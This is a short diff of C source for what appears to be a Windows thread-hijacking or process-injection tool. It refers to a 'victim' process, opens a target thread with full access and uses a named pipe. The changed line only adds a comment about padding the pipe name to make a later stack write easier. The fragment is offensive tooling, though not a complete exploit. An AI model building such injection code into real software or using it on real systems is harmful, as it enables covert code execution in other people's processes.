@@ -4,7 +4,7 @@
 #define HEAP_ALLOC 0x1000 //how much mem to alloc on heap in victim
 #define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))
 int main(int argc, char** argv){
-    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe";
+    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe"; //note: this name including null byte at end shld be a multiple of 4 bytes. makes the write to stack a little simpler later on
     DWORD tid = atoi(argv[1]); //get thread id using args
     HANDLE thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
     
